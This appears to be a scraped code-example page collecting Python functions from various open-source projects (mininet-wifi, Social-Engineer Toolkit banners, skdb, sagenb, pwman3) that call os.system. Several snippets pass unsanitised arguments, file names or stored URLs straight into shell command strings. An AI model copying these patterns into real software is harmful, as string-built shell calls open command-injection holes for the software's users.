        self.assertEqual(len(obj), 2)
        self.assertEqual(obj, labels)

     
Example 22
From project mininet-wifi-master, under directory util/mininet, in source file wireless.py.
Score: 10
vote
vote
def _start_module(self, wirelessRadios):
        info( "*** Enabling Wireless Module\n" )
        os.system( 'modprobe mac80211_hwsim radios=%s' % wirelessRadios )
        #raise Exception( 'OVSIntf cannot do ifconfig ' + cmd )
        
     
Example 23
From project social-engineer-toolkit, under directory src/webattack/fsattack, in source file fsattacks.py.
Score: 10
vote
vote
def displayProperOSClear(self):
    # Clear The screen

        osName = self.determineOperatingSystem()

        if osName == "windows":
            # clear screen on windows		
            os.system('cls') 
        else:
	     # clear screen on linux/unix -- mac
            os.system('clear')



 
Example 24
From project social-engineer-toolkit, under directory src/core, in source file setcore.py.
Score: 10
vote
vote
def show_banner(define_version,graphic):

    if graphic == "1":
        if check_os() == "posix":
            os.system("clear")
        if check_os() == "windows":
            os.system("cls")
        show_graphic()
    else:
        os.system("clear")

    print bcolors.BLUE + """
[---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
[---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                     [---]
[---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
[---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
[---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]

""" + bcolors.GREEN+"""        Welcome to the Social-Engineer Toolkit (SET). 
         The one stop shop for all of your SE needs.
"""
    print bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
    print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC

 
Example 25
From project Logix, under directory logixtest/trunk/ltest, in source file runner.py.
Score: 10
vote
vote
def emacsto(file, line):
    import os
    file = os.path.basename(file)
    print file,line
    os.system(r'gnuclient -batch -eval "(switch-to-buffer \"%s\")(goto-line %s)"'
             % (file, line))
    os.system("wmctrl -a emacs")
# }}}

    
 
Example 26
From project skdb, under directory clients, in source file thingiverse.py.
Score: 10
vote
vote
def download_thingiverse_partial(start=0, end=434):
    '''creates a backup from thing:434 to thing:2073'''

    if not os.path.exists("thingiverse_data"): os.mkdir("thingiverse_data")

    for current in range(start, end):
        os.system("cd thingiverse_data; wget http://thingiverse.com/thing:%s --output-document \"%s\"" % (str(current), str(current)))

 
Example 27
From project skdb, under directory clients, in source file skdb-get.py.
Score: 10
vote
vote
def get_package(package_name, verbose=False, repo=settings.paths["repositories"], package_dir=skdb.settings.paths["package_dir"], branch="master", *args, **keywords):
    '''usage: %prog <package name> [--verbose] [--repo <URL>] [--package-dir /usr/local/share/skdb/] [--branch master]
    download hardware and exit'''
    #assert not have_package(package_name), "package already installed"
    if package_name == "help" or package_name == "": print get_package.__doc__ #how do i do this?

    if not isinstance(repo, list): repo = [repo] #it's actually a list in the config file
    if repo[0][-1:] != "/": repo[0] = repo[0]+"/" #add trailing slash to url if not there
    package_url = "git://" + repo[0] + "/" + package_name + ".git"

    #make package_dir exist
    os.system('mkdir -p "%s"' % (package_dir)) #package names cant have spaces so why the quotes?
    
    subdir = os.path.join(package_dir, package_name)
    if os.path.exists(subdir):
        command = 'cd "%s"; git pull origin "%s"' % (subdir, branch)
        print "updating:", package_name
    else: 
        command = 'cd "%s"; git clone "%s"' % (package_dir, package_url)
        print "installing:", package_name
    if verbose: print "command is: ", command
    exit_status = os.system(command)
    if exit_status != 0: raise EnvironmentError, "something went wrong at "+ package_url
    if verbose: print "checking %s for dependencies..." % (package_name)
        
    return

 
Example 28
From project skdb, under directory import_tools, in source file pov2png.py.
Score: 10
vote
vote
def pov2png(pov_file, png_file):
    '''usage: %prog <pov_file> <png_file>
    converts from pov to a png file'''
    print "pov2png: starting"
    print "pov_file is: ", pov_file
    print "png_file is: ", png_file
    os.system("povray -d %s +O%s" % (pov_file, png_file))
    print "pov2png: done"

 
Example 29
From project skdb, under directory import_tools, in source file stl2pov.py.
Score: 10
vote
vote
def stl2pov(stl_file, pov_file):
    '''usage: stl2pov.py input.stl output.pov
    makes both output.pov and output.pov.inc'''
    os.system("stl2pov -s %s > %s.inc" % (stl_file, pov_file))
    pov_template = '''#include "%s.inc"

    background{color rgb 1 }    

    object{  m_facet 
    rotate 90*x

    texture{  pigment{ color rgb <1,0.5,0> }
             finish {   ambient 0.15
                        diffuse 0.85
                        specular 0.3 } } } 

    light_source {  <-20,100,20>  color rgb 2}  

    camera {
    perspective
      angle 0
      right x*image_width/image_height
      location <-100,50,10>
      look_at y
    }''' % (pov_file)

    pov_file = open(pov_file, "w")
    pov_file.write(pov_template)
    pov_file.close()

 
Example 30
From project play1, under directory python/Lib, in source file os.py.
Score: 10
vote
vote
def popen2(cmd, mode="t", bufsize=-1):
            """Execute the shell command 'cmd' in a sub-process.  On UNIX, 'cmd'
            may be a sequence, in which case arguments will be passed directly to
            the program without shell intervention (as with os.spawnv()).  If 'cmd'
            is a string it will be passed to the shell (as with os.system()). If
            'bufsize' is specified, it sets the buffer size for the I/O pipes.  The
            file objects (child_stdin, child_stdout) are returned."""
            import warnings
            msg = "os.popen2 is deprecated.  Use the subprocess module."
            warnings.warn(msg, DeprecationWarning, stacklevel=2)

            import subprocess
            PIPE = subprocess.PIPE
            p = subprocess.Popen(cmd, shell=True, bufsize=bufsize,
                                 stdin=PIPE, stdout=PIPE, close_fds=True)
            return p.stdin, p.stdout
         
Example 31
From project play1, under directory python/Lib, in source file pydoc.py.
Score: 10
vote
vote
def getpager():
    """Decide what method to use for paging through text."""
    if type(sys.stdout) is not types.FileType:
        return plainpager
    if not sys.stdin.isatty() or not sys.stdout.isatty():
        return plainpager
    if 'PAGER' in os.environ:
        if sys.platform == 'win32': # pipes completely broken in Windows
            return lambda text: tempfilepager(plain(text), os.environ['PAGER'])
        elif os.environ.get('TERM') in ('dumb', 'emacs'):
            return lambda text: pipepager(plain(text), os.environ['PAGER'])
        else:
            return lambda text: pipepager(text, os.environ['PAGER'])
    if os.environ.get('TERM') in ('dumb', 'emacs'):
        return plainpager
    if sys.platform == 'win32' or sys.platform.startswith('os2'):
        return lambda text: tempfilepager(plain(text), 'more <')
    if hasattr(os, 'system') and os.system('(less) 2>/dev/null') == 0:
        return lambda text: pipepager(text, 'less')

    import tempfile
    (fd, filename) = tempfile.mkstemp()
    os.close(fd)
    try:
        if hasattr(os, 'system') and os.system('more "%s"' % filename) == 0:
            return lambda text: pipepager(text, 'more')
        else:
            return ttypager
    finally:
        os.unlink(filename)

 
Example 32
From project play1, under directory python/Lib, in source file pdb.py.
Score: 10
vote
vote
def help():
    for dirname in sys.path:
        fullname = os.path.join(dirname, 'pdb.doc')
        if os.path.exists(fullname):
            sts = os.system('${PAGER-more} '+fullname)
            if sts: print '*** Pager exit status:', sts
            break
    else:
        print 'Sorry, can\'t find the help file "pdb.doc"',
        print 'along the Python search path'

 
Example 33
From project sagenb, under directory sagenb/misc, in source file misc.py.
Score: 10
vote
vote
def open_page(address, port, secure, path=""):
    if secure:
        rsrc = 'https'
    else:
        rsrc = 'http'

    os.system('%s %s://%s:%s%s 1>&2 > /dev/null &'%(browser(), rsrc, address, port, path))

 
Example 34
From project sagenb, under directory sagenb/notebook, in source file run_notebook.py.
Score: 10
vote
vote
def cmd_exists(cmd):
    """
    Return True if the given cmd exists.
    """
    return os.system('which %s 2>/dev/null >/dev/null' % cmd) == 0


 
Example 35
From project sagenb, under directory sagenb/notebook, in source file sagetex.py.
Score: 10
vote
vote
def sagetex(filename, gen=True, **kwds):
    """
    Turn a latex document into an interactive notebook server.

    THIS IS ONLY A PROOF-of-CONCEPT.

    EXAMPLES::

        sage: sagetex('foo.tex')        # not tested
        [pops up web browser with live version of foo.tex.]
    """
    if not os.path.exists(filename):
        raise IOError, "No such file: '%s'"%filename

    if not filename.endswith('.tex'):
        raise ValueError, "File must be a latex file (end in .tex): '%s'"%filename
    if not '\\document' in open(filename).read():
        raise ValueError, "File must be a latex file (contain \\document...): '%s'"%filename
    
    if gen:
        os.system('latex2html -no_images %s'%filename)

    base = os.path.splitext(os.path.split(filename)[1])[0]
    absp = os.path.abspath(filename)
    path = os.path.splitext(absp)[0]

    for F in os.listdir(base):
        fn = os.path.join(base, F)
        if not fn.endswith('.html'):
            continue
        r = open(fn).read()
        r = r.replace('<PRE>', '<div class="verbatim"><pre>')
        r = r.replace('</PRE>', '</pre></div>')
        open(fn,'w').write(r)

    notebook(sagetex_path=path, start_path="/sagetex/index.html", **kwds)
    
    

    
 
Example 36
From project pwman3, under directory , in source file setup.py.
Score: 10
vote
vote
def run(self):
        base_path = "http://www.voidspace.org.uk/downloads/pycrypto26"
        if 'win32' in sys.platform:
            if 'AMD64' not in sys.version:
                pycrypto = 'pycrypto-2.6.win32-py2.7.exe'
            else:  # 'for AMD64'
                pycrypto = 'pycrypto-2.6.win-amd64-py2.7.exe'
            os.system('easy_install '+base_path+'/'+pycrypto)
            install.run(self)
        else:
            print(('Please use pip or your Distro\'s package manager '
                   'to install pycrypto ...'))


 
Example 37
From project pwman3, under directory pwman/ui, in source file win.py.
Score: 10
vote
vote
def do_open(self, args):
        ids = self._get_ids(args)
        if not args:
            self.help_open()
            return
        if len(ids) > 1:
            print ("Can open only 1 link at a time ...")
            return None

        ce = CryptoEngine.get()
        nodes = self._db.getnodes(ids)

        for node in nodes:
            url = ce.decrypt(node[3])
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            os.system("start "+url)

     
Example 38
From project rcos-binstat, under directory , in source file x86_translator.py.
Score: 10
vote
vote
def translate(self, target):
    IRS = []
    
    def getnasm(data):
      open("/tmp/x.asm",'w').write(data)
      import os
      os.system("ndisasm -u /tmp/x.asm > /tmp/x.asm.out")
      return open("/tmp/x.asm.out",'r').readlines()[0].strip()
    
    visited =[]
    for seg in target.memory.segments:
      if seg.code:
        for start_addr in target.entry_points:
          addr = start_addr
          while addr+1 < seg.end:
            if addr in visited:
              break

            data = target.memory.getrange(addr,min(addr+15,seg.end-1))

            if len(data) < 15:
              data = data+"\x00"*15
            #print "disassemble @ %x : %r"%(addr,data)          
            #print "\n",hex(addr), [hex(ord(x)) for x in data]
            try:
              sz, IR = self.disassemble(data, addr)
            except InvalidInstruction:
              print 'invalid instruction: %x'%addr, `data`
              break
            #print sz, "IRIR=",IR
            #print hex(addr), IR#, getnasm(data)
            visited.append(addr)
            
            
            IRS += IR
            addr += sz
          
    return IRS
            
   
Example 39
From project Torque2D, under directory engine/source/testing/googleTest/test, in source file gtest_test_utils.py.
Score: 10
vote
vote
def GetExitStatus(exit_code):
  """Returns the argument to exit(), or -1 if exit() wasn't called.

  Args:
    exit_code: the result value of os.system(command).
  """

  if os.name == 'nt':
    # On Windows, os.WEXITSTATUS() doesn't work and os.system() returns
    # the argument to exit() directly.
    return exit_code
  else:
    # On Unix, os.WEXITSTATUS() must be used to extract the exit status
    # from the result of os.system().
    if os.WIFEXITED(exit_code):
      return os.WEXITSTATUS(exit_code)
    else:
      return -1


 
Example 40
From project xpaxs-legacy, under directory , in source file setup.py.
Score: 10
vote
vote
def ui_cvt(self, arg, dirname, fnames):
        if os.path.split(dirname)[-1] in ('ui'):
            for fname in fnames:
                if fname.endswith('.ui'):
                    ui = '/'.join([dirname, fname])
                    py = os.path.splitext(ui)[0]+'.py'
                    if os.path.isfile(py):
                        if os.path.getmtime(ui) < os.path.getmtime(py):
                            continue
                    os.system('pyuic4 -o %s %s'%(py, ui))
                    print('converted %s'%fname)
                elif fname.endswith('.qrc'):
                    rc = '/'.join([dirname, fname])
                    py = os.path.splitext(rc)[0]+'_rc.py'
                    if os.path.isfile(py):
                        if os.path.getmtime(rc) < os.path.getmtime(py):
                            continue
                    os.system('pyrcc4 -o %s %s'%(py, rc))
                    print('converted %s'%fname)

     
Example 41
From project CommercialDetection-master, under directory src, in source file main.py.
Score: 8
vote
vote
def main():

    if len(sys.argv) == 1:
        
        print "Format is \n python main.py -[r/g/l] [labels_file] video_name"
        raise Exception(INCORRECT_FORMAT_ERROR)
        
    elif sys.argv[1] == "-r":
        
        if len(sys.argv) != 3:
            print "Format is \n python main.py -[r/g/l] [labels_file] video_name"
            raise Exception(INCORRECT_FORMAT_ERROR)
            
        file_type = mimetypes.guess_type(sys.argv[2])[0]
        if file_type[:3] != "vid":#The file is not a video file
            print "Invalid video file"
            raise Exception(INCORRECT_VIDEO_FILE_ERROR)
            
        print "Recognizing: ", sys.argv[2]
        recog = Recognize(sys.argv[2])
        recog.recognize()

    elif sys.argv[1] == "-g":
        
        if len(sys.argv) != 4:
            print "Format is \n python main.py -[r/g/l] [labels_file] video_name"
            raise Exception(INCORRECT_FORMAT_ERROR)
        
        label_file_type = mimetypes.guess_type(sys.argv[2])[0]
        video_file_type = mimetypes.guess_type(sys.argv[3])[0]
        
        if label_file_type[:3] != "tex":#The file is not a labels file
            print "Invalid labels file"
            raise Exception(INCORRECT_LABEL_FILE_ERROR)
        
        if video_file_type[:3] != "vid":#The file is not a video file
            print "Invalid video file"
            raise Exception(INCORRECT_VIDEO_FILE_ERROR)
            
        print "Generating db for video: ", sys.argv[3], "\nwith labels file:", sys.argv[2]
        gen = Generate(sys.argv[2], sys.argv[3])
        gen.run()

    elif sys.argv[1] == "-l":
        
        if len(sys.argv) != 4:
            print "Format is \n python main.py -[r/g/l] [labels_file] video_name"
            raise Exception(INCORRECT_FORMAT_ERROR)
        
        label_file_type = mimetypes.guess_type(sys.argv[2])[0]
        video_file_type = mimetypes.guess_type(sys.argv[3])[0]
        
        if label_file_type[:3] != "tex":#The file is not a labels file
            return INCORRECT_LABEL_FILE_ERROR
        
        if video_file_type[:3] != "vid":#The file is not a video file
            return INCORRECT_VIDEO_FILE_ERROR
            
        print "Learning for video: ", sys.argv[3]
        video_name = sys.argv[3]
        ffmpeg.convert_video(video_name)
        name, extension = video_name[-5:].split('.')
        name = video_name.split('/')[-1]
        name = name[:-len(extension)-1]
        
        os.system("cp " + sys.argv[2] + " " + WEB_LABELS)        
        os.system("mv " + name + '.webm ' + 'web/output/static/output/' + WEB_VIDEO_NAME)
        print "Please go to the URL to edit labels"
        
    return SUCCESS

 
Example 42
From project pokecrystal-demo, under directory extras, in source file crystal.py.
Score: 8
vote
vote
def generate_diff_insert(line_number, newline, debug=False):
    """generates a diff between the old main.asm and the new main.asm
    note: requires python2.7 i think? b/c of subprocess.check_output"""
    global asm
    original = "\n".join(line for line in asm)
    newfile = deepcopy(asm)
    newfile[line_number] = newline # possibly inserting multiple lines
    newfile = "\n".join(line for line in newfile)

    # make sure there's a newline at the end of the file
    if newfile[-1] != "\n":
        newfile += "\n"

    original_filename = "ejroqjfoad.temp"
    newfile_filename = "fjiqefo.temp"

    original_fh = open(original_filename, "w")
    original_fh.write(original)
    original_fh.close()

    newfile_fh = open(newfile_filename, "w")
    newfile_fh.write(newfile)
    newfile_fh.close()

    try:
        from subprocess import CalledProcessError
    except ImportError:
        CalledProcessError = None

    try:
        diffcontent = subprocess.check_output("diff -u ../main.asm " + newfile_filename, shell=True)
    except (AttributeError, CalledProcessError):
        p = subprocess.Popen(["diff", "-u", "../main.asm", newfile_filename], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        diffcontent = out

    os.system("rm " + original_filename)
    os.system("rm " + newfile_filename)

    if debug: print diffcontent
    return diffcontent

 
Example 43
From project mininet-wifi-master, under directory mininet, in source file wifi.py.
Score: 8
vote
vote
def checkNetworkManager(self, storeMacAddress): 
        self.storeMacAddress = storeMacAddress     
        self.printMac = False   
        unmatch = ""
        if(os.path.exists('/etc/NetworkManager/NetworkManager.conf')):
            if(os.path.isfile('/etc/NetworkManager/NetworkManager.conf')):
                self.resultIface = open('/etc/NetworkManager/NetworkManager.conf')
                lines=self.resultIface
        
            isNew=True
            for n in lines:
                if("unmanaged-devices" in n):
                    unmatch = n
                    echo = n
                    echo.replace(" ", "")
                    echo = echo[:-1]+";"
                    isNew = False
            if(isNew):
                os.system("echo '#' >> /etc/NetworkManager/NetworkManager.conf")
                unmatch = "#"
                echo = "[keyfile]\nunmanaged-devices="
            
            for n in range(len(self.storeMacAddress)): 
                if self.storeMacAddress[n] not in unmatch:
                    echo = echo + "mac:"
                    echo = echo + self.storeMacAddress[n] + ";"
                    self.printMac = True
                
            if(self.printMac):
                for line in fileinput.input('/etc/NetworkManager/NetworkManager.conf', inplace=1): 
                    if(isNew):
                        if line.__contains__('#'): 
                            print line.replace(unmatch, echo)
                        else:
                            print line.rstrip()
                    else:
                        if line.__contains__('unmanaged-devices'): 
                            print line.replace(unmatch, echo)
                        else:
                            print line.rstrip()
             
    
     
Example 44
From project mininet-wifi-master, under directory mininet, in source file node.py.
Score: 8
vote
vote
def start( self, controllers ):
        "Start up a new OVS OpenFlow switch using ovs-vsctl"
        if self.inNamespace:
            raise Exception(
                'OVS kernel switch does not work in a namespace' )
        int( self.dpid, 16 )  # DPID must be a hex string
        # Command to add interfaces
        
        intfs = ''.join( ' -- add-port %s %s' % ( self, intf ) +
                         self.intfOpts( intf )
                         for intf in self.intfList() 
                         if self.ports[ intf ] and not intf.IP() )
                
        # Command to create controller entries
        clist = [ ( self.name + c.name, '%s:%s:%d' %
                  ( c.protocol, c.IP(), c.port ) )
                  for c in controllers ]
        if self.listenPort:
            clist.append( ( self.name + '-listen',
                            'ptcp:%s' % self.listenPort ) )
        ccmd = '-- --id=@%s create Controller target=\\"%s\\"'
        if self.reconnectms:
            ccmd += ' max_backoff=%d' % self.reconnectms
        cargs = ' '.join( ccmd % ( name, target )
                          for name, target in clist )
        # Controller ID list
        cids = ','.join( '@%s' % name for name, _target in clist )
        # Try to delete any existing bridges with the same name
        if not self.isOldOVS():
            cargs += ' -- --if-exists del-br %s' % self
        # One ovs-vsctl command to rule them all!
        self.vsctl( cargs +
                    ' -- add-br %s' % self +
                    ' -- set bridge %s controller=[%s]' % ( self, cids  ) +
                    self.bridgeOpts() +
                    intfs )
        # If necessary, restore TC config overwritten by OVS
        if not self.batch:
            for intf in self.intfList():
                self.TCReapply( intf )       
               
        self.newapif=[]
        self.apif = subprocess.check_output("iwconfig 2>&1 | grep IEEE | awk '{print $1}'",shell=True)
        self.apif = self.apif.split("\n")
        
        for apif in self.apif:
            if apif not in Node.phyInterfaces:
                self.newapif.append(apif)
        
        self.newapif.pop()
        self.newapif = sorted(self.newapif)
        self.newapif.sort(key=len, reverse=False)
        
        if(Node.isCode==True):
            if(self.name[:2]=="ap"):
                os.system("ovs-vsctl add-port %s %s" % (self.name, (self.newapif[self.nAP])))
                Node.nAP+=1
        
    # This should be ~ int( quietRun( 'getconf ARG_MAX' ) ),
    # but the real limit seems to be much lower
     
Example 45
From project mininet-wifi-master, under directory util/mininet, in source file net.py.
Score: 8
vote
vote
def addStation( self, name, cls=None, **params ):
        """Add host.
           name: name of host to add
           cls: custom host class/constructor (optional)
           params: parameters for host
           returns: added host"""
        #Default IP and MAC addresses
        defaults = { 'ip': ipAdd( self.nextIP,
                                  ipBaseNum=self.ipBaseNum,
                                  prefixLen=self.prefixLen ) +
                                  '/%s' % self.prefixLen }
        if self.autoSetMacs:
            defaults[ 'mac' ] = macColonHex( self.nextIP )
        if self.autoPinCpus:
            defaults[ 'cores' ] = self.nextCore
            self.nextCore = ( self.nextCore + 1 ) % self.numCores
        #self.nextIP += 1
        defaults.update( params )
        if not cls:
            cls = self.host
        h = cls( name, **defaults )      
        self.hosts.append( h )
        self.nameToNode[ name ] = h
        self.wirelessifaceControl.append(self.nextIface)
        self.wirelessdeviceControl.append(name)
        self.stationName.append(name)
        
        os.system("iw phy phy%s set netns %s" % (self.nextIface, h.pid))
        self.host.cmd(h,"ip link set dev wlan%s name %s-wlan0" % (self.nextIface, h))
        self.host.cmd(h,"ifconfig %s-wlan0 up" % h)
        self.host.cmd(h,"ifconfig %s-wlan0 10.1.1.%s/%s" % (h, self.nextIP, self.prefixLen)) 
        
        #callfun="start"
        #intf=self.nextIface
        #src=name        
        #wlink(callfun, intf, src)
               
        #self.host.cmd(h,"iw %s-wlan0 connect %s" % (h, "my_ssid"))
        self.nextIP += 1        
        self.nextIface+=1
        #os.system("iw dev wlan2 interface add mesh2 type station")
        #os.system("sleep 2")
        #os.system("sleep 2")
        #os.system("iw dev mesh2 station join bazookaa")
        return h


     
Example 46
From project django-pollngo, under directory pollngo, in source file pygooglechart.py.
Score: 8
vote
vote
def test():
    chart = GroupedVerticalBarChart(320, 200)
    chart = PieChart2D(320, 200)
    chart = ScatterChart(320, 200)
    chart = SimpleLineChart(320, 200)
    sine_data = [math.sin(float(a) / 10) * 2000 + 2000 for a in xrange(100)]
    random_data = [a * random.random() * 30 for a in xrange(40)]
    random_data2 = [random.random() * 4000 for a in xrange(10)]
#    chart.set_bar_width(50)
#    chart.set_bar_spacing(0)
    chart.add_data(sine_data)
    chart.add_data(random_data)
    chart.add_data(random_data2)
#    chart.set_line_style(1, thickness=2)
#    chart.set_line_style(2, line_segment=10, blank_segment=5)
#    chart.set_title('heloooo')
#    chart.set_legend(('sine wave', 'random * x'))
#    chart.set_colours(('ee2000', 'DDDDAA', 'fF03f2'))
#    chart.fill_solid(Chart.BACKGROUND, '123456')
#    chart.fill_linear_gradient(Chart.CHART, 20, '004070', 1, '300040', 0,
#        'aabbcc00', 0.5)
#    chart.fill_linear_stripes(Chart.CHART, 20, '204070', .2, '300040', .2,
#        'aabbcc00', 0.2)
    axis_left_index = chart.set_axis_range(Axis.LEFT, 0, 10)
    axis_left_index = chart.set_axis_range(Axis.LEFT, 0, 10)
    axis_left_index = chart.set_axis_range(Axis.LEFT, 0, 10)
    axis_right_index = chart.set_axis_range(Axis.RIGHT, 5, 30)
    axis_bottom_index = chart.set_axis_labels(Axis.BOTTOM, [1, 25, 95])
    chart.set_axis_positions(axis_bottom_index, [1, 25, 95])
    chart.set_axis_style(axis_bottom_index, '003050', 15)

#    chart.set_pie_labels(('apples', 'oranges', 'bananas'))

#    chart.set_grid(10, 10)

#    for a in xrange(0, 100, 10):
#        chart.add_marker(1, a, 'a', 'AACA20', 10)

    chart.add_horizontal_range('00A020', .2, .5)
    chart.add_vertical_range('00c030', .2, .4)

    chart.add_fill_simple('303030A0')

    chart.download('test.png')

    url = chart.get_url()
    print url
    if 0:
        data = urllib.urlopen(chart.get_url()).read()
        open('meh.png', 'wb').write(data)
        os.system('start meh.png')


 
Example 47
From project mybolg-master, under directory libs/sqlalchemy/testing, in source file profiling.py.
Score: 8
vote
vote
def profiled(target=None, **target_opts):
    """Function profiling.

    @profiled()
    or
    @profiled(report=True, sort=('calls',), limit=20)

    Outputs profiling info for a decorated function.

    """

    profile_config = {'targets': set(),
                      'report': True,
                      'print_callers': False,
                      'print_callees': False,
                      'graphic': False,
                      'sort': ('time', 'calls'),
                      'limit': None}
    if target is None:
        target = 'anonymous_target'

    @decorator
    def decorate(fn, *args, **kw):
        elapsed, load_stats, result = _profile(
            fn, *args, **kw)

        graphic = target_opts.get('graphic', profile_config['graphic'])
        if graphic:
            os.system("runsnake %s" % filename)
        else:
            report = target_opts.get('report', profile_config['report'])
            if report:
                sort_ = target_opts.get('sort', profile_config['sort'])
                limit = target_opts.get('limit', profile_config['limit'])
                print(("Profile report for target '%s'" % (
                    target, )
                ))

                stats = load_stats()
                stats.sort_stats(*sort_)
                if limit:
                    stats.print_stats(limit)
                else:
                    stats.print_stats()

                print_callers = target_opts.get(
                    'print_callers', profile_config['print_callers'])
                if print_callers:
                    stats.print_callers()

                print_callees = target_opts.get(
                    'print_callees', profile_config['print_callees'])
                if print_callees:
                    stats.print_callees()

        return result
    return decorate


 
Example 48
From project systemimgpack-master, under directory de-dat, in source file sparse_img.py.
Score: 8
vote
vote
def __init__(self, simg_fn, file_map_fn=None):
    try:
      self.simg_f = f = open(simg_fn, "rb")
    except FileNotFoundError:
      print("invalid file or path")
      os.system("pause")
      sys.exit()
    header_bin = f.read(28)
    header = struct.unpack("<I4H4I", header_bin)
    magic = header[0]
    major_version = header[1]
    minor_version = header[2]
    file_hdr_sz = header[3]
    chunk_hdr_sz = header[4]
    self.blocksize = blk_sz = header[5]
    self.total_blocks = total_blks = header[6]
    total_chunks = header[7]
    image_checksum = header[8]
    if magic != 0xED26FF3A:
      raise ValueError("Magic should be 0xED26FF3A but is 0x%08X" % (magic,))
    if major_version != 1 or minor_version != 0:
      raise ValueError("I know about version 1.0, but this is version %u.%u" %
                       (major_version, minor_version))
    if file_hdr_sz != 28:
      raise ValueError("File header size was expected to be 28, but is %u." %
                       (file_hdr_sz,))
    if chunk_hdr_sz != 12:
      raise ValueError("Chunk header size was expected to be 12, but is %u." %
                       (chunk_hdr_sz,))
    print("Total of %u %u-byte output blocks in %u input chunks."
          % (total_blks, blk_sz, total_chunks))
    pos = 0   # in blocks
    care_data = []
    self.offset_map = offset_map = []
    for i in range(total_chunks):
      header_bin = f.read(12)
      header = struct.unpack("<2H2I", header_bin)
      chunk_type = header[0]
      reserved1 = header[1]
      chunk_sz = header[2]
      total_sz = header[3]
      data_sz = total_sz - 12
      if chunk_type == 0xCAC1:
        if data_sz != (chunk_sz * blk_sz):
          raise ValueError(
              "Raw chunk input size (%u) does not match output size (%u)" %
              (data_sz, chunk_sz * blk_sz))
        else:
          care_data.append(pos)
          care_data.append(pos + chunk_sz)
          offset_map.append((pos, chunk_sz, f.tell(), None))
          pos += chunk_sz
          f.seek(data_sz, os.SEEK_CUR)
      elif chunk_type == 0xCAC2:
        fill_data = f.read(4)
        care_data.append(pos)
        care_data.append(pos + chunk_sz)
        offset_map.append((pos, chunk_sz, None, fill_data))
        pos += chunk_sz
      elif chunk_type == 0xCAC3:
        if data_sz != 0:
          raise ValueError("Don't care chunk input size is non-zero (%u)" %
                           (data_sz))
        else:
          pos += chunk_sz
      elif chunk_type == 0xCAC4:
        raise ValueError("CRC32 chunks are not supported")
      else:
        raise ValueError("Unknown chunk type 0x%04X not supported" %
                         (chunk_type,))
    self.care_map = RangeSet(care_data)
    self.offset_index = [i[0] for i in offset_map]
    if file_map_fn:
      self.LoadFileBlockMap(file_map_fn)
    else:
      self.file_map = {"__DATA": self.care_map}
   
Example 49
From project pyCAF-master, under directory pycaf/importer/importServer/Linux, in source file import_functions.py.
Score: 8
vote
vote
def extract_archive(server_to_import, logger, filename):
    import tarfile
    import tempfile
    
    tmp_path = None
    
    if os.path.isdir(filename):
        xtract_dir = filename
        
        if not(os.path.isdir(filename + "/etc") and os.path.isdir(filename + "/var")):
            logger.error("/etc or /var not decompressed")
            logger.error("You referenced an uncompressed directory. Please, decompressed all the content")
            exit(1)
            
        hostname = filename.split("/")[-1]
    else:
        # Prepare extraction output directory
        tmp_path = tempfile.mkdtemp()
        
        # 1 - decompress archive
        compressed = tarfile.open(filename)
        compressed.extractall(tmp_path)
        # Get extraction directory name and server hostname
        for (dirname, dirnames, filenames) in os.walk(tmp_path):
            if len(dirnames) != 1:
                raise tarfile.ExtractError("Unknown archive format")
            hostname = dirnames.pop()
            tmp_xtract_dir = os.path.join(tmp_path, hostname)
            if os.path.isdir(tmp_xtract_dir):
                xtract_dir = tmp_xtract_dir
        # Extraction of the /etc archive if applicable
        etc = xtract_dir + "/etc.tar.bz2"
        comp = tarfile.open(etc)
        comp.extractall(xtract_dir)
        os.system("chmod -R +r " + str(xtract_dir) + "/etc")
        
        var_spool_cron = xtract_dir + "/var_spool_cron.tar.bz2"
        compr = tarfile.open(var_spool_cron)
        compr.extractall(xtract_dir)
        
    server_to_import.name = hostname
    return [tmp_path, xtract_dir]
    
 
Example 50
From project fabric, under directory doc/site/bin, in source file markdown2.py.
Score: 5
vote
vote
def main(argv=sys.argv):
    usage = "usage: %prog [PATHS...]"
    version = "%prog "+__version__
    parser = optparse.OptionParser(prog="markdown2", usage=usage,
        version=version, description=cmdln_desc,
        formatter=_NoReflowFormatter())
    parser.add_option("-v", "--verbose", dest="log_level",
                      action="store_const", const=logging.DEBUG,
                      help="more verbose output")
    parser.add_option("--encoding",
                      help="specify encoding of text content")
    parser.add_option("--html4tags", action="store_true", default=False, 
                      help="use HTML 4 style for empty element tags")
    parser.add_option("-s", "--safe", metavar="MODE", dest="safe_mode",
                      help="sanitize literal HTML: 'escape' escapes "
                           "HTML meta chars, 'replace' replaces with an "
                           "[HTML_REMOVED] note")
    parser.add_option("-x", "--extras", action="append",
                      help="Turn on specific extra features (not part of "
                           "the core Markdown spec). Supported values: "
                           "'code-friendly' disables _/__ for emphasis; "
                           "'code-color' adds code-block syntax coloring; "
                           "'link-patterns' adds auto-linking based on patterns; "
                           "'footnotes' adds the footnotes syntax.")
    parser.add_option("--use-file-vars",
                      help="Look for and use Emacs-style 'markdown-extras' "
                           "file var to turn on extras. See "
                           "<http://code.google.com/p/python-markdown2/wiki/Extras>.")
    parser.add_option("--link-patterns-file",
                      help="path to a link pattern file")
    parser.add_option("--self-test", action="store_true",
                      help="run internal self-tests (some doctests)")
    parser.add_option("--compare", action="store_true",
                      help="run against Markdown.pl as well (for testing)")
    parser.set_defaults(log_level=logging.INFO, compare=False,
                        encoding="utf-8", safe_mode=None, use_file_vars=False)
    opts, paths = parser.parse_args()
    log.setLevel(opts.log_level)

    if opts.self_test:
        return _test()

    if opts.extras:
        extras = set()
